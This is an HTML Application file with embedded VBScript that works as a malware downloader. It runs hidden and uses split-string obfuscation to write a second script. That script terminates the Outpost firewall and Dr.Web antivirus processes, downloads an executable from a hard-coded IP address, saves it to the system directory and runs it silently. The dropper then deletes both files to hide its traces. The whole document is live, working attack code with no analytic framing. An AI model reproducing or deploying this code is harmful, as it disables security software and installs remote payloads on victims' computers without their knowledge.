<HTML>
<HEAD>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none"
BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no"
MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no"
SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">

Function asdw(a,s)
	a.write(s)
End Function
MyFile = dirsystem&"\q123.vbs"
drte52f = "ileSyst"
asd13 = "ripti"
Set qwe = CreateObject("Sc"+asd13 +"ng.F"+drte52f+"emObject")
Set asd = qwe.CreateTextFile(MyFile, True)
asdw asd, "WScript.Sleep(1000)" & vbcrlf
asdw asd, "strComputer = "".""" & vbcrlf
qwe13="ocessL"
asdw asd, "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
asdw asd, "    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
asdw asd, "Set colPr" + qwe13 + "ist = objWMIService.ExecQuery _ " & vbcrlf
asdw asd, "    (""SELECT * FROM Win32_Process WHERE Name = 'OUTPOST.EXE'"")" & vbcrlf
asdw asd, "For Each objProcess in colProcessList" & vbcrlf
asdw asd, "    objProcess.Terminate()" & vbcrlf
asdw asd, "Next" & vbcrlf
asdw asd, "strComputer = "".""" & vbcrlf
asdw asd, "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
asdw asd, "    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
asdw asd, "Set colProcessList = objWMIService.ExecQuery _ " & vbcrlf
asdw asd, "    (""SELECT * FROM Win32_Process WHERE Name = 'DRWEB32.EXE'"")" & vbcrlf
asdw asd, "For Each objProcess in colProcessList" & vbcrlf
asdw asd, "    objProcess.Terminate()" & vbcrlf
asdw asd, "Next" & vbcrlf
asdw asd, "Dim BD" & vbcrlf
asdw asd, "Dim xml" & vbcrlf
asdw asd, "WScript.Sleep(5000)" & vbcrlf
asdw asd, "f5j545i = ""MLH""" & vbcrlf
asdw asd, "Set xml = CreateObject(""Microsoft.X""+f5j545i+""TTP"")" & vbcrlf
asdw asd, "xml.Open ""GET"", ""http://69.50.177.102/x125/runsvc36.exe"", False" & vbCrlf
asdw asd, "xml.Send" & vbcrlf
asdw asd, "C=C=C=C" & vbcrlf
asdw asd, "BD = xml.ResponseBody" & vbcrlf
asdw asd, "C=C=C=C" & vbcrlf
asdw asd, "Const adTypeBinary = 1" & vbcrlf
asdw asd, "Const adSaveCreateOverWrite = 2" & vbcrlf
asdw asd, "C=C=C=C" & vbcrlf
asdw asd, "Dim BinaryStream" & vbcrlf
asdw asd, "C=C=C=C" & vbcrlf
asdw asd, "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
asdw asd, "BinaryStream.Type = adTypeBinary" & vbcrlf
asdw asd, "A=A=A=A" & vbcrlf
asdw asd, "BinaryStream.Open" & vbcrlf
asdw asd, "BinaryStream.Write BD" & vbcrlf
asdw asd, "b=b=b=b" & vbcrlf
asdw asd, "BinaryStream.SaveToFile dirsystem&""\sm.exe"", adSaveCreateOverWrite" & vbCrlf
asdw asd, "Dim WshShell" & vbcrlf
asdw asd, "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
asdw asd, "WshShell.Run dirsystem&""\sm.exe"", 0, False" & vbCrlf
asdw asd, "WScript.Sleep(6000)" & vbCrlf
asd.close
Set qwe = Nothing
Set asd = Nothing
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run dirsystem&"\q123.vbs", 0, True
Set fso = CreateObject("Scripting.FileSystemObject")
pthe = dirsystem&"\q123.vbs"
pth = dirsystem&"\sm.exe"
Set f1 = fso.GetFile(pthe)
Set f2 = fso.GetFile(pth)
f1.Delete
f2.Delete
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>